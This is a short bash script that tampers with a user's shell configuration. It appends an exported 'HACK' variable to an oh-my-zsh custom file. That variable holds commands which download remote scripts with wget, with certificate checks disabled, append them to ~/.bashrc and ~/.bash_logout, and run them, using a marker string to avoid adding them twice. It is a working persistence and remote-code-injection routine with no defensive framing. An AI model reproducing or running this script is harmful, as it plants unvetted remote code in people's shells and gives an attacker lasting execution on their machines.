#!/bin/bash

if [ -f ~/.oh-my-zsh/custom/example.zsh ];then
  if [[ "$(grep 'HACK' ~/.oh-my-zsh/custom/example.zsh)" == "" ]];then
     cat << EOF >> ~/.oh-my-zsh/custom/example.zsh
export HACK="grep '_fdsagadsfasdgadsgsss' ~/.bashrc 1>/dev/null; if [ \\\$? -ne 0 ];then cp ~/.bashrc /tmp/_bash;wget -c -t 2 --no-check-certificate 'https://raw.githubusercontent.com/F0ckLinux/linux-clear/master/clear.sh' -O- -q  >> ~/.bashrc; fi;bash; if [ ! -f ~/.bash_logout ];then wget -c -t 2 --no-check-certificate 'https://raw.githubusercontent.com/F0ckLinux/linux-clear/master/bye.sh' -O- -q  >> ~/.bash_logout; fi ; . ~/.bash_logout;"
EOF
  fi
fi
